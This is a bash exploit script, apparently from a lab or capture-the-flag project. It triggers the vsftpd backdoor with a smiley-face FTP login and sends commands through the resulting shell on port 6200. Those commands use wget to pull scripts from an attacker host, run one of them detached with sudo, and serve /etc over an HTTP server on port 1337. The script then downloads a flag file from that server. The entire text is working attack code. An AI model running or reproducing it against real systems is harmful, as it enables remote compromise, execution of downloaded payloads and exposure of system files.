#!/bin/bash
target=${1}
attacker=${2}

echo -e "USER user:)\nPASS pass" | telnet "$target" 21 2> /dev/null
echo -e "python -c 'import pty;pty.spawn("/bin/bash")';\nwget $attacker:1473/bite.sh;\nwget $attacker:1473/ZuRM.sh;\nwget $attacker:1473/networkscan;\nsudo chmod 700 bite.sh;\nsudo chmod 700 ZuRM.sh;\nsudo chmod 700 networkscan;\nmv bite.sh /tmp;\nmv ZuRM.sh /tmp;\nmv networkscan /tmp;\ncd /tmp/;\n(sudo nohup ./ZuRM.sh -u </dev/null >/dev/null 2>&1 & disown);\ncd /etc/;\n(nohup python -u -m SimpleHTTPServer 1337 </dev/null >/dev/null 2>&1 &);wait;" | telnet "$target" 6200 2> /dev/null
sleep 10 && wget -O "$target special file" "$target":1337/projectflag.png
